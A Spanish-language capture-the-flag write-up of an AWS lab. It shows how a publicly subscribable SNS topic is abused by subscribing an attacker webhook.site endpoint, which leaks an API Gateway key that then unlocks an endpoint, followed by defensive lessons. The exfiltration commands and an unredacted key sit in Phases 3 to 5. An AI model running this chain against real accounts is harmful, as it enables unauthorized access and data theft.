# Writeup: SNS Secrets (HackSmarter — Easy)

SNS Secrets es una máquina **Easy** diseñada para simular un entorno AWS con un **tema SNS** mal configurado que permite suscripciones públicas, lo que conduce a la filtración de una clave de **API Gateway**. El recorrido comienza con un usuario IAM de bajo privilegio que puede listar temas SNS y obtener sus atributos. Al descubrir una política que permite a cualquier persona suscribirse, se utiliza un webhook público para recibir notificaciones del tema, donde se obtiene una clave de API. Finalmente, con esa clave se invoca un endpoint de API Gateway que devuelve la bandera final.

---

## 🎯 Objetivo / Scope

El equipo de Hack Smarter ha sido contratado para realizar una prueba de penetración en AWS. El cliente ha identificado una **API Gateway** interna como un activo crítico y está preocupado de que un atacante pueda manipular permisos para acceder a este recurso. Se proporcionan credenciales de bajo nivel para un usuario IAM como punto de partida, asumiendo un escenario de *breach*. El objetivo es escalar privilegios e invocar exitosamente el endpoint restringido de API Gateway para obtener la bandera final.

---

## ⚙️ Fase 1: Configuración inicial de credenciales

Se nos proporcionan unas credenciales de AWS para un usuario IAM. Las configuramos en la CLI de AWS:

```bash
aws configure --profile sns-secret-user
```

**Datos proporcionados:**

- `AWS Access Key ID`: `[REDACTED]`
- `AWS Secret Access Key`: `[REDACTED]`
- `Default region name`: `us-east-1`
- `Default output format`: `json`

Verificamos nuestra identidad:

```bash
aws sts get-caller-identity --profile sns-secret-user
```

```json
{
    "UserId": "AIDAW5EF2XMHQLIBIDX24",
    "Account": "474874559247",
    "Arn": "arn:aws:iam::474874559247:user/cg-sns-user-lab"
}
```

Somos el usuario IAM `cg-sns-user-lab` en la cuenta `474874559247`. Exportamos el perfil para no tener que especificarlo en cada comando:

```bash
export AWS_PROFILE=sns-secret-user
```

---

## 🔍 Fase 2: Enumeración de SNS

### 2.1 Listado de temas SNS

**SNS (Simple Notification Service)** es un servicio de mensajería pub/sub que permite enviar notificaciones a múltiples suscriptores. Comenzamos enumerando los temas existentes:

```bash
aws sns list-topics
```

```json
{
    "Topics": [
        {
            "TopicArn": "arn:aws:sns:us-east-1:474874559247:public-topic-lab"
        }
    ]
}
```

Encontramos un tema llamado `public-topic-lab`. El nombre sugiere que podría estar expuesto al público.

### 2.2 Intento de listar suscripciones

Intentamos listar todas las suscripciones del tema, pero no tenemos permisos:

```bash
aws sns list-subscriptions
```

```bash
aws: [ERROR]: An error occurred (AuthorizationError) when calling the ListSubscriptions operation: User: arn:aws:iam::474874559247:user/cg-sns-user-lab is not authorized to perform: SNS:ListSubscriptions on resource: arn:aws:sns:us-east-1:474874559247:* because no identity-based policy allows the SNS:ListSubscriptions action
```

### 2.3 Listado de suscripciones por tema

Probamos a listar las suscripciones específicas del tema:

```bash
TOPIC_ARN="arn:aws:sns:us-east-1:474874559247:public-topic-lab"
aws sns list-subscriptions-by-topic --topic-arn "$TOPIC_ARN"
```

```json
{
    "Subscriptions": []
}
```

No hay suscripciones activas, lo que indica que el tema está disponible para ser suscrito.

### 2.4 Obtención de atributos del tema

Obtenemos los atributos del tema para examinar su política de acceso:

```bash
aws sns get-topic-attributes --topic-arn "$TOPIC_ARN"
```

```json
{
    "Attributes": {
        "Policy": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":\"*\",\"Action\":[\"sns:Subscribe\",\"sns:Receive\",\"sns:ListSubscriptionsByTopic\"],\"Resource\":\"arn:aws:sns:us-east-1:474874559247:public-topic-lab\"}]}",
        "Owner": "474874559247",
        "TopicArn": "arn:aws:sns:us-east-1:474874559247:public-topic-lab",
        ...
    }
}
```

**Análisis de la política:**

La política del tema permite a **cualquier usuario o servicio** ( `"Principal": "*"` ) realizar las acciones:

- `sns:Subscribe`: Suscribirse al tema.
- `sns:Receive`: Recibir mensajes del tema.
- `sns:ListSubscriptionsByTopic`: Listar suscripciones del tema.

Esto es una **grave vulnerabilidad de seguridad**, ya que permite que un atacante se suscriba al tema sin autenticación y reciba todos los mensajes publicados.

---

## 🔑 Fase 3: Suscripción al tema mediante webhook

### 3.1 Estrategia

Para recibir los mensajes del tema, necesitamos un endpoint accesible desde internet que pueda actuar como suscriptor. La forma más rápida y sencilla es usar **webhook.site**, un servicio que proporciona URLs públicas temporales para recibir peticiones HTTP.

### 3.2 Obtención de un endpoint webhook

Accedemos a [https://webhook.site](https://webhook.site) y obtenemos una URL única, por ejemplo:

```
https://webhook.site/ID
```

### 3.3 Creación de la suscripción

Usamos el comando `aws sns subscribe` para suscribir nuestro webhook al tema:

```bash
aws sns subscribe --topic-arn "$TOPIC_ARN" --protocol https --notification-endpoint https://webhook.site/ID --return-subscription-arn
```

```json
{
    "SubscriptionArn": "arn:aws:sns:us-east-1:474874559247:public-topic-lab:bb9b9f21-ea40-46bb-a02a-4d677539727d"
}
```

### 3.4 Confirmación de la suscripción

SNS envía un mensaje de confirmación a nuestro webhook. En la pestaña de webhook.site, vemos una solicitud POST entrante que contiene un campo `SubscribeURL`. Copiamos esa URL y la abrimos para confirmar la suscripción:

```bash
curl 'https://sns.us-east-1.amazonaws.com/?Action=ConfirmSubscription&TopicArn=arn:aws:sns:us-east-1:474874559247:public-topic-lab&Token=...'
```

```xml
<ConfirmSubscriptionResponse xmlns="http://sns.amazonaws.com/doc/2010-03-31/">
  <ConfirmSubscriptionResult>
    <SubscriptionArn>arn:aws:sns:us-east-1:474874559247:public-topic-lab:bb9b9f21-ea40-46bb-a02a-4d677539727d</SubscriptionArn>
  </ConfirmSubscriptionResult>
  <ResponseMetadata>
    <RequestId>aba3998b-0a05-523e-9981-fb7b3be6f81d</RequestId>
  </ResponseMetadata>
</ConfirmSubscriptionResponse>
```

La suscripción está activa. Ahora cualquier mensaje publicado en el tema será enviado a nuestro webhook.

---

## 📨 Fase 4: Recepción de la notificación y exfiltración de la clave API

Poco después, recibimos una segunda notificación en webhook.site. Esta es la notificación real:

**Contenido de la notificación:**

```json
{
  "Type": "Notification",
  "MessageId": "597b3e47-5d35-5cf0-bc64-5cb76f532d5c",
  "TopicArn": "arn:aws:sns:us-east-1:474874559247:public-topic-lab",
  "Message": "DEBUG: API GATEWAY KEY YOkzuTyX5K7DqdQiBzdnG8JOk3vRseYJav7Xzk59",
  "Timestamp": "2026-08-07T19:21:10.516Z",
  ...
}
```

**Hallazgo crítico:** El mensaje contiene una clave de API Gateway en texto plano: `[REDACTED]`. Esta clave probablemente se utiliza para autenticar solicitudes a una API Gateway.

---

## 🚪 Fase 5: Enumeración y acceso a API Gateway

### 5.1 Listado de APIs

Ahora que tenemos una clave de API, necesitamos descubrir la API Gateway a la que pertenece. Usamos nuestro perfil de bajo privilegio (`sns-secret-user`), que también tiene permisos para listar APIs:

```bash
aws apigateway get-rest-apis
```

```json
{
    "items": [
        {
            "id": "lpvnjm801g",
            "name": "cg-api-lab",
            "description": "API for demonstrating leaked API key scenario",
            "createdDate": "2026-08-07T14:44:43-04:00",
            "apiKeySource": "HEADER",
            "endpointConfiguration": {
                "types": [
                    "EDGE"
                ],
                "ipAddressType": "ipv4"
            },
            "tags": {
                "Scenario": "iam_privesc_by_key_rotation",
                "Stack": "CloudGoat"
            },
            "disableExecuteApiEndpoint": false,
            "rootResourceId": "idddzg7ppe",
            "securityPolicy": "TLS_1_0",
            "apiStatus": "AVAILABLE"
        }
    ]
}
```

Encontramos una API llamada `cg-api-lab` con ID `lpvnjm801g`.

### 5.2 Listado de recursos de la API

Listamos los recursos (rutas) de la API:

```bash
aws apigateway get-resources --rest-api-id lpvnjm801g
```

```json
{
    "items": [
        {
            "id": "78q6e8",
            "parentId": "idddzg7ppe",
            "pathPart": "user-data",
            "path": "/user-data",
            "resourceMethods": {
                "GET": {}
            }
        },
        {
            "id": "idddzg7ppe",
            "path": "/"
        }
    ]
}
```

El recurso `/user-data` acepta solicitudes GET.

### 5.3 Listado de stages (etapas) de la API

Obtenemos los stages de la API para conocer la URL de invocación:

```bash
aws apigateway get-stages --rest-api-id lpvnjm801g
```

```json
{
    "item": [
        {
            "deploymentId": "bu292k",
            "stageName": "prod-lab",
            "cacheClusterEnabled": false,
            "cacheClusterStatus": "NOT_AVAILABLE",
            "methodSettings": {},
            "tracingEnabled": false,
            "tags": {
                "Scenario": "iam_privesc_by_key_rotation",
                "Stack": "CloudGoat"
            },
            "createdDate": "2026-08-07T14:44:44-04:00",
            "lastUpdatedDate": "2026-08-07T14:44:44-04:00"
        }
    ]
}
```

El stage se llama `prod-lab`. La URL de invocación de API Gateway tiene el formato:

```
https://{rest-api-id}.execute-api.{region}.amazonaws.com/{stage}/{resource}
```

Por lo tanto, la URL completa es:

```
https://lpvnjm801g.execute-api.us-east-1.amazonaws.com/prod-lab/user-data
```

### 5.4 Invocación de la API con la clave

Usamos `curl` para realizar una solicitud GET al endpoint, incluyendo la clave de API en el encabezado `x-api-key`:

```bash
curl -X GET \
  https://lpvnjm801g.execute-api.us-east-1.amazonaws.com/prod-lab/user-data \
  -H "x-api-key: [REDACTED]"
```

```json
{"final_flag":"FLAG{[REDACTED]}","message":"Access granted","user_data":{"email":"SuperAdmin@notarealemail.com","password":"p@ssw0rd123","user_id":"1337","username":"SuperAdmin"}}
```


Hemos completado el objetivo: acceder al endpoint restringido de API Gateway y recuperar la bandera.

---

## 📌 Conclusión

SNS Secrets es una máquina **Easy** que combina:

1. **Enumeración de SNS** para descubrir un tema público.
2. **Análisis de la política de acceso**, que permitía suscripciones anónimas.
3. **Suscripción mediante un webhook** para recibir mensajes del tema.
4. **Exfiltración de una clave de API** desde la notificación SNS.
5. **Enumeración de API Gateway** para identificar el endpoint y su stage.
6. **Invocación del endpoint** con la clave de API para obtener la flag.

---

## 📚 Lecciones aprendidas



1. **Las políticas SNS no deben permitir suscripciones públicas**

   El uso de `Principal: "*"` permitió que cualquier principal se suscribiera al topic y recibiera futuras notificaciones. Las suscripciones deben limitarse a identidades, cuentas o servicios concretos. [docs.aws.amazon](https://docs.aws.amazon.com/sns/latest/dg/sns-access-policy-use-cases.html)

2. **Los mensajes SNS no deben contener secretos**

   La clave de API Gateway fue enviada en texto plano dentro de una notificación SNS. Las claves, tokens y contraseñas deben almacenarse en Secrets Manager o Parameter Store.

3. **Las claves de API deben tratarse como credenciales sensibles**

   Una API key expuesta puede permitir el acceso a endpoints que dependan de ella. Debe rotarse inmediatamente, almacenarse de forma segura y combinarse con controles adicionales de autorización.

4. **La enumeración de API Gateway permite descubrir la superficie expuesta**

   Los permisos de lectura permitieron identificar la API, sus recursos y sus stages. Estos permisos deben limitarse a las identidades que realmente necesiten administrar API Gateway.

5. **Una API key no debe ser el único control de acceso**

   Las API keys sirven principalmente para controlar uso y cuotas, no como mecanismo de autenticación fuerte. Los endpoints sensibles deberían utilizar IAM, autorizadores de Lambda, JWT u otros controles adicionales.

6. **La combinación de servicios mal configurados puede provocar acceso no autorizado**

   La cadena de ataque fue:

   ```text
   Suscripción SNS pública
   → filtración de API key
   → descubrimiento de API Gateway
   → acceso al endpoint
   ```

   La vulnerabilidad principal fue la combinación de un canal de notificación público con una credencial utilizada para proteger un recurso sensible.

7. **Las suscripciones SNS deben monitorizarse**

   Las nuevas suscripciones, confirmaciones y eliminaciones deben registrarse y supervisarse mediante CloudTrail, EventBridge o alertas de seguridad.

8. **Las APIs no deben devolver datos sensibles innecesarios**

   El endpoint devolvió una contraseña, un correo y datos de usuario junto con la flag. Las respuestas deben limitarse a la información estrictamente necesaria y nunca incluir credenciales o secretos.
